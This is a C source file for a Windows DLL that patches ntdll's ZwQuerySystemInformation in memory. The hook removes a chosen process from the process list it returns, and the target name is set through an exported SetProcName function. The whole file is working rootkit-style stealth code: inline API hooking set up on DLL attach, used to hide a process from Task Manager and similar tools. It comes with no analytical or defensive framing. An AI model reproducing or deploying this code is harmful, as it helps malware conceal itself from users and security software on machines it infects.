#include "windows.h"
#include "tchar.h"

#define STATUS_SUCCESS (0x00000000L)

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 37,
	SystemLookasideInformation = 45
}SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
}SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* PFZwQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, 
													PVOID SystemInformation, 
													ULONG SystemInformationLength, 
													PULONG ReturnLength);

#define DEF_NTDLL ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION ("ZwQuerySystemInformation")

//global variable (in sharing memory)
#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()

BYTE g_pOrgBytes[14] = { 0, };

BOOL HookCode(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes) {
	FARPROC pfnOrg;
	DWORD dwOldProtect;
	//JMP QWORD PTR [RIP + (offset)] == FF 25 XX XX XX XX
	BYTE pBuf1[6] = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00 };

	//New Function Address
	BYTE pBuf2[8] = { 0, };
	
	PBYTE pByte;

	//Get API Address
	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;

	//Already Hooked
	if (pByte[0] == 0xFF && pByte[1] == 0x25)
		return FALSE;
	
	//Backup The Original 16 Bytes Code & Get API Entry Point
	memcpy(pOrgBytes, pfnOrg, 14);
	memcpy(pBuf2, &pfnNew, 8);

	//Add Write Attribute To Memory For 16 Bytes Code Patch
	VirtualProtect((LPVOID)pfnOrg, 14, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	//Code Patch
	//FF 25 00 00 00 00
	memcpy(pfnOrg, pBuf1, 6);

	//FF 25 00 00 00 00 + (New Function Address)  == JMP New Function
	//New Function Address is 12 Bytes
	memcpy((LPVOID)((DWORD_PTR)pfnOrg + 6), pBuf2, 8);
	
	//Restore Memory Attribute
	VirtualProtect((LPVOID)pfnOrg, 14, dwOldProtect, &dwOldProtect);

	return TRUE;
}

BOOL UnHookCode(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes) {
	FARPROC pfnOrg;
	DWORD dwOldProtect;
	PBYTE pByte;

	//Get API Address
	pfnOrg = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;

	//Already UnHooked
	if (pByte[0] != 0xFF && pByte[1] != 0x25)
		return FALSE;

	//Add Write Attribute To Memory For 14 Bytes Code Patch
	VirtualProtect((LPVOID)pfnOrg, 14, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	//Code Patch
	memcpy(pfnOrg, pOrgBytes, 14);

	//Restore Memory Attribute
	VirtualProtect((LPVOID)pfnOrg, 14, dwOldProtect, &dwOldProtect);

	return TRUE;
}

NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength) {

	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev = { 0, };
	char szProcName[MAX_PATH] = { 0, };

	UnHookCode(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);

	//Original API Call -> Get Process Linked List -> Modify Process Linked List -> Return
	pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), DEF_ZWQUERYSYSTEMINFORMATION);
	status = ((PFZwQuerySystemInformation)pFunc)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;

	//Only Implements In Case: SystemProcessInformation
	if (SystemInformationClass == SystemProcessInformation) {
		//SYSTEM_PROCESS_INFORMATION Type Casting
		//pCur: Head of Single Linked List
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while (TRUE) {
			//Compare ProcessName
			//g_szProcName : Stealth Target ProcessName
			//=> Set by SetProcName()
			if (pCur->Reserved2[1] != NULL) {
				if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName)) {
					//Remove Target Process From Linked List
					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else
						pPrev->NextEntryOffset += pCur->NextEntryOffset;
				}
				else
					pPrev = pCur;
			}
			if (pCur->NextEntryOffset == 0)
				break;

			//Next Object of Linked List
			pCur = (PSYSTEM_PROCESS_INFORMATION)((DWORD_PTR)pCur + pCur->NextEntryOffset);
		}
	}

__NTQUERYSYSTEMINFORMATION_END:
	HookCode(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);

	return status;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	char szCurProc[MAX_PATH] = { 0, };
	char* p = NULL;

	GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
	p = strrchr(szCurProc, '\\');
	if ((p != NULL) && !_stricmp(p + 1, "[PROCESS NAME]")) // fix
		return TRUE;
	
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		HookCode(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
		break;
	case DLL_PROCESS_DETACH:
		UnHookCode(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);
		break;
	}
	return TRUE;
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void SetProcName(LPCTSTR szProcName) {
		_tcscpy_s(g_szProcName, szProcName);
	}
#ifdef __cplusplus
}
#endif 